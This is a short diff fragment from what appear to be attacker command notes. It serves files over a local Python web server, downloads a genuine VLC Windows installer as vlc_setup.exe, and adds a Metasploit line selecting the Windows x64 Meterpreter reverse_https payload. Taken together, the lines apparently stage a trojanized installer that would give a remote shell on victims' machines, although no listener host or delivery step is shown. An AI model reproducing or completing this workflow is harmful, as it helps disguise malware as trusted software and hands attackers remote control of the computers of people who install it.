@@ -12,3 +12,5 @@ python3 -m http.server 8080
 
 wget https://get.videolan.org/vlc/3.0.20/win64/vlc-3.0.20-win64.exe -O vlc_setup.exe
 
+set PAYLOAD windows/x64/meterpreter/reverse_https
+
